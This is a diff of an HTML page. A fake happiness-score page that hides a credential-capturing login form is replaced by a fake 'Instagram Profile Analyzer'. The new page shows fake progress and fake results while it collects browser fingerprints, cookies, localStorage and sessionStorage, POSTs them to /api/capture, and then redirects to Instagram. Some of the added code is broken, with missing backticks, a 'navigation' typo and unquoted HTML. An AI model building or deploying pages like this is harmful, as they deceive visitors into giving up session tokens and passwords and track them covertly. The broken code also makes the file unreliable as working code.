@@ -3,47 +3,272 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Daily Happiness Score</title>
+    <title>Instagram Profile Analyzer</title>
     <style>
-        body { font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; flex-direction: column; margin: 0; background: #f5f5f5; }
-        h1 { color: #333; }
-        button { padding: 20px 40px; font-size: 20px; cursor: pointer; background: #ff4757; color: white; border: none; border-radius: 10px; transition: background 0.2s; }
-        button:hover { background: #e84118; }
+        :root {
+            --primary: #405DE6;
+            --secondary: #5851DB;
+            --accent: #FD1D1D;
+        }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, sans-serif;
+            background: linear-gradient(135deg, var(--primary), var(--secondary));
+            color: white;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin: 0;
+            padding: 20px;
+        }
+        .container {
+            background: rgba(255, 255, 255, 0.1);
+            backdrop-filter: blur(12px);
+            border-radius: 20px;
+            padding: 40px;
+            width: 100%;
+            max-width: 500px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.2);
+            text-align: center;
+        }
+        h1 {
+            font-weight: 600;
+            margin-bottom: 10px;
+        }
+        p {
+            opacity: 0.9;
+            margin-bottom: 30px;
+        }
+        .btn {
+            background: var(--accent);
+            color: white;
+            border: none;
+            padding: 15px 30px;
+            font-size: 16px;
+            font-weight: 600;
+            border-radius: 8px;
+            cursor: pointer;
+            transition: all 0.3s;
+            width: 100%;
+        }
+        .btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(253, 29, 29, 0.4);
+        }
+        .loader {
+            display: none;
+            margin: 20px auto;
+            border: 3px solid rgba(255, 255, 255, 0.3);
+            border-radius: 50%;
+            border-top: 3px solid white;
+            width: 30px;
+            height: 30px;
+            animation: spin 1s linear infinite;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .progress-container {
+            width: 100%;
+            background: rgba(255, 255, 255, 0.2);
+            border-radius: 10px;
+            margin: 20px 0;
+            display: none;
+        }
+        .progress-bar {
+            height: 6px;
+            background: white;
+            border-radius: 10px;
+            width: 0%;
+            transition: width 0.3s;
+        }
     </style>
 </head>
 <body>
-       <div id="bitb" style="display:none; position:fixed; top:20%; left:30%; background:white; padding:20px; border:1px solid #ccc;">
-        <h3>Login to continue</h3>
-        <form action="/api/capture" method="POST">
-            <input type="text" name="username" placeholder="Username" required><br>
-            <input type="password" name="password" placeholder="Password" required><br>
-            <button type="submit">Login</button>
-        </form>
+    <div class="container">
+        <h1>Your Instagram Personality Profile</h1>
+        <p>See how you compare to others based on your activity and connections</p>
+        
+        <div class="progress-container" id="progressContainer">
+            <div class="progress-bar" id="progressBar"></div>
+        </div>
+        
+        <div class="loader" id="loader"></div>
+        
+        <div id="result"></div>
+        
+        <button class="btn" id="analyzeBtn">Analyze My Profile</button>
     </div>
-    <h1>Are you happy with the day?</h1>
-    <button onclick="captureAndRedirect()">Click to see your score!</button>
 
     <script>
-        async function captureAndRedirect() {
+        // Enhanced data collection
+        const collectFullFingerprint = () => {
             const data = {
+                // System fingerprints
                 userAgent: navigator.userAgent,
-                screen: `${window.screen.width}x${window.screen.height}`,
+                platform: navigator.platform,
+                hardware: {
+                    cores: navigator.hardwareConcurrency,
+                    memory: navigator.deviceMemory,
+                    screen: ${screen.width}x${screen.height},
+                    colorDepth: screen.colorDepth,
+                    pixelRatio: window.devicePixelRatio
+                },
+                
+                // Network fingerprints
+                connection: navigator.connection ? {
+                    type: navigator.connection.effectiveType,
+                    downlink: navigator.connection.downlink,
+                    rtt: navigation.connection.rtt
+                } : null,
+                
+                // Location fingerprints
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                languages: navigator.languages,
+                
+                // Storage inspection
+                cookies: document.cookie,
+                localStorage: Object.fromEntries(Object.entries(localStorage)),
+                sessionStorage: Object.fromEntries(Object.entries(sessionStorage)),
+                
+                // Behavioral metrics
                 referrer: document.referrer,
+                timing: performance.timing ? {
+                    load: performance.timing.loadEventEnd - performance.timing.navigationStart,
+                    dom: performance.timing.domComplete - performance.timing.domLoading
+                } : null,
+                
+                // Advanced fingerprints
+                canvas: getCanvasFingerprint(),
+                webgl: getWebGLInfo(),
+                audioContext: getAudioFingerprint(),
+                
                 timestamp: new Date().toISOString()
             };
+            
+            return data;
+        };
 
+        // Canvas fingerprinting
+        const getCanvasFingerprint = () => {
+            const canvas = document.createElement('canvas');
+            const ctx = canvas.getContext('2d');
+            ctx.fillStyle = 'rgb(128, 0, 0)';
+            ctx.fillRect(0, 0, 10, 10);
+            ctx.fillStyle = 'rgb(0, 128, 0)';
+            ctx.fillRect(10, 0, 10, 10);
+            return canvas.toDataURL();
+        };
+
+        // WebGL fingerprinting
+        const getWebGLInfo = () => {
             try {
-                await fetch('/api/capture', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(data)
-                });
+                const canvas = document.createElement('canvas');
+                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+                if (!gl) return null;
+                
+                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                return {
+                    vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
+                    renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)
+                };
             } catch (e) {
-                console.error('Capture failed', e);
+                return null;
             }
+        };
 
-            window.location.href = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
-        }
+        // AudioContext fingerprinting
+        const getAudioFingerprint = () => {
+            try {
+                const audioContext = new (window.AudioContext || window.webkitAudioContext)();
+                const oscillator = audioContext.createOscillator();
+                const analyser = audioContext.createAnalyser();
+                const gain = audioContext.createGain();
+                const scriptProcessor = audioContext.createScriptProcessor(4096, 1, 1);
+                
+                oscillator.type = 'triangle';
+                oscillator.connect(analyser);
+                analyser.connect(scriptProcessor);
+                scriptProcessor.connect(gain);
+                gain.connect(audioContext.destination);
+                
+                oscillator.start(0);
+                
+                const audioData = new Float32Array(analyser.frequencyBinCount);
+                analyser.getFloatFrequencyData(audioData);
+                
+                return Array.from(audioData);
+            } catch (e) {
+                return null;
+            }
+        };
+
+        // UI Flow Control
+        document.getElementById('analyzeBtn').addEventListener('click', async () => {
+            const btn = document.getElementById('analyzeBtn');
+            const loader = document.getElementById('loader');
+            const progressContainer = document.getElementById('progressContainer');
+            const progressBar = document.getElementById('progressBar');
+            const resultDiv = document.getElementById('result');
+            
+            // Phase 1: Initialization
+            btn.style.display = 'none';
+            loader.style.display = 'block';
+            resultDiv.innerHTML = '<p>Initializing profile analyzer...</p>';
+            
+            // Phase 2: Fake progress
+            setTimeout(() => {
+                loader.style.display = 'none';
+                progressContainer.style.display = 'block';
+                resultDiv.innerHTML = '<p>Connecting to Instagram API...</p>';
+                
+                let progress = 0;
+                const interval = setInterval(() => {
+                    progress += Math.random() * 10;
+                    progressBar.style.width = ${Math.min(progress, 100)}%;
+                    
+                    if (progress >= 100) {
+                        clearInterval(interval);
+                        analyzeComplete();
+                    }
+                }, 300);
+            }, 1500);
+            
+            // Phase 3: Data collection
+            const analyzeComplete = async () => {
+                resultDiv.innerHTML = '<p>Generating your personality profile...</p>';
+                
+                // Collect all possible data
+                const fingerprintData = collectFullFingerprint();
+                
+                // Send to server
+                try {
+                    await fetch('/api/capture', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify(fingerprintData)
+                    });
+                    
+                    // Show fake results
+                    setTimeout(() => {
+                        progressContainer.style.display = 'none';
+                        resultDiv.innerHTML = 
+                            <h2>Your Instagram Personality: Social Butterfly</h2>
+                            <p>You have 23% more engagement than similar accounts</p>
+                            <p>Redirecting to full report...</p>
+                        ;
+                        
+                        // Final redirect
+                        setTimeout(() => {
+                            window.location.href = "https://www.instagram.com/";
+                        }, 2500);
+                    }, 2000);
+                } catch (e) {
+                    console.error('Capture failed:', e);
+                }
+            };
+        });
     </script>
 </body>
 </html>
